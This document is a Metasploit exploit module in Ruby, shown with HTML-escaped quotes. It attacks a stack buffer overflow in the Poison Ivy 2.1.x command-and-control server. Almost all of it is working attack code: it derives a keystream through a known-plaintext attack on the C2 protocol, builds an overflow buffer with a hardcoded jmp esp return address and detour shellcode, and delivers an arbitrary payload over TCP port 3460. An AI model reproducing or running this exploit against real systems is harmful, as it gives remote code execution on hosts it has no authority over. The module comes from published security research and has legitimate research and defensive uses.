# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::Tcp
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Poison Ivy 2.1.x C2 Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a stack buffer overflow in the Poison Ivy 2.1.x C&C server.
        The exploit does not need to know the password chosen for the bot/server communication.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Jos Wetzels&#039; # Vulnerability Discovery, exploit & Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware&#039; ],
        ],
      &#039;DisclosureDate&#039; => &#039;Jun 03 2016&#039;,
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;             => 0x847 # limited by amount of known plaintext (hard upper limit is 0xFFD)
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [
            &#039;Poison Ivy 2.1.4 on Windows XP SP3&#039;,
            {
              &#039;Ret&#039; => 0x00469159, # jmp esp from "Poison Ivy 2.1.4.exe"
              &#039;StoreAddress&#039; => 0x00520000, # .tls section address from "Poison Ivy 2.1.4.exe"
              &#039;InfoSizeOffset&#039; => 0x1111, # offset of InfoSize variable
              &#039;Packet2Offset&#039; => 0xB9E # offset of second packet within server&#039;s response
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0
    ))
 
    register_options(
      [
        Opt::RPORT(3460)
      ], self.class)
 
  end
 
  # XOR two strings
  def xor_strings(s1, s2)
    s1.unpack(&#039;C*&#039;).zip(s2.unpack(&#039;C*&#039;)).map{ |a,b| a ^ b }.pack(&#039;C*&#039;)
  end
 
  # Obtain keystream using known plaintext
  def get_keystream(ciphertext, knownPlaintext)
    if(ciphertext.length < knownPlaintext.length)
      return xor_strings(ciphertext, knownPlaintext[0, ciphertext.length])
    else
      return xor_strings(ciphertext, knownPlaintext)
    end
  end
 
  # Apply keystream to plaintext
  def use_keystream(plaintext, keyStream)
    if(keyStream.length > plaintext.length)
      return xor_strings(plaintext, keyStream[0, plaintext.length])
    else
      return xor_strings(plaintext, keyStream)
    end
  end
 
  def check
    connect
    # Poke
    sock.put("\x01")
    # Fetch response
    response = sock.get_once(6)
 
    if (response == "\x89\xFF\x90\x0B\x00\x00")
      vprint_status("Poison Ivy C&C version 2.1.4 detected.")
      return Exploit::CheckCode::Appears
    elsif (response == "\x89\xFF\x38\xE0\x00\x00")
      vprint_status("Poison Ivy C&C version 2.0.0 detected.")
      return Exploit::CheckCode::Safe
    end
 
    return Exploit::CheckCode::Safe
  end
 
  # Load known plaintext chunk
  def load_c2_packet_chunk
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;poison_ivy_c2&#039;, &#039;chunk_214.bin&#039;)
    chunk = ::File.open(path, &#039;rb&#039;) { |f| chunk = f.read }
    chunk
  end
 
  def exploit
    # Known plaintext from C2 packet
    knownPlaintext1 = "\x89\x00\x69\x0c\x00\x00"
    knownPlaintext2 = load_c2_packet_chunk()
 
    # detour shellcode (mov eax, StoreAddress; jmp eax)
    detourShellcode =  "\xB8" + [target[&#039;StoreAddress&#039;]].pack("V") # mov eax, StoreAddress
    detourShellcode << "\xFF\xE0" # jmp eax
 
    # Padding where necessary
 
    # Construct exploit buffer
    exploitBuffer =  Rex::Text.rand_text_alpha(4)              # infoLen (placeholder)
    exploitBuffer << "\xFF" * 0x104                            # readfds
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # pDestinationSize
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # infoSize (placeholder)
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # headerAllocSize
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # lParam
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # timeout
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # hWnd
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # s
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # old EBP
    exploitBuffer << [target[&#039;Ret&#039;]].pack("V")    # EIP
    exploitBuffer << [target[&#039;StoreAddress&#039;]].pack("V")  # arg_0
    exploitBuffer << detourShellcode # detour to storage area
 
    # Calculate values
    allocSize = exploitBuffer.length + 1024
    infoLen = payload.encoded.length
    infoSize = (infoLen + 4)
 
    # Handshake
    connect
    print_status("Performing handshake...")
 
    # Poke
    sock.put("\x01")
 
    # Fetch response
    response = sock.get(target[&#039;Packet2Offset&#039;] + knownPlaintext1.length + infoSize)
 
    eHeader = response[target[&#039;Packet2Offset&#039;], 6]
    eInfo = response[target[&#039;Packet2Offset&#039;] + 10..-1]
 
    if ((eHeader.length >= knownPlaintext1.length) and (knownPlaintext1.length >= 6) and (eInfo.length >= knownPlaintext2.length) and (knownPlaintext2.length >= infoSize))
      # Keystream derivation using Known Plaintext Attack
      keyStream1 = get_keystream(eHeader, knownPlaintext1)
      keyStream2 = get_keystream(eInfo, knownPlaintext2)
 
      # Set correct infoLen
      exploitBuffer = [infoLen].pack("V") + exploitBuffer[4..-1]
 
 
      # Build packet
      malHeader = use_keystream("\x89\x01" + [allocSize].pack("V"), keyStream1)
 
      # Encrypt infoSize bytes
      encryptedExploitBuffer = use_keystream(exploitBuffer[0, infoSize], keyStream2) + exploitBuffer[infoSize..-1]
 
      # Make sure infoSize gets overwritten properly since it is processed before decryption
      encryptedExploitBuffer = encryptedExploitBuffer[0, target[&#039;InfoSizeOffset&#039;]] + [infoSize].pack("V") + encryptedExploitBuffer[target[&#039;InfoSizeOffset&#039;]+4..-1]
 
      # Finalize packet
      exploitPacket = malHeader + [encryptedExploitBuffer.length].pack("V") + encryptedExploitBuffer
 
      print_status("Sending exploit...")
      # Send exploit
      sock.put(exploitPacket)
    else
      print_status("Not enough keystream available...")
    end
 
    select(nil,nil,nil,5)
    disconnect
  end
 
end

